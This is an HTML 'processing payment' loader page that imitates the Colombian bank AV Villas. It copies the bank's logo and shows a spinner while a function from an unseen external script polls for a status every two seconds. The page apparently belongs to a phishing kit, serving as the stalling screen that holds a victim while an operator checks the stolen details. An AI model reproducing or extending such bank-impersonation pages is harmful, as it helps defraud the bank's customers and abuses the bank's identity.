<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Procesando Pago | AV Villas</title>
    <link rel="icon" href="img/favicon.png" type="image/x-icon">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="../../scripts/functions2.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f8f8f8;
            font-family: Arial, Helvetica, sans-serif;
        }

        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 30px;
        }

        .loader-logo {
            height: 52px;
            width: auto;
        }

        .spinner-red {
            width: 48px;
            height: 48px;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #ed1b2f;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        .loader-text {
            color: #252b31;
            font-size: 16px;
            font-weight: 500;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader-container">
        <img src="https://www.avvillas.com.co/bancadigital/assets/bavv-brand/bavv/brand-primary.svg" alt="AV Villas" class="loader-logo">
        <div class="spinner-red"></div>
        <div class="loader-text">Estamos procesando tu transacciÃ³n...</div>
    </div>

    <script>
        $(document).ready(function() {
            setInterval(consultar_estado, 2000);
        });
    </script>
</body>
</html>

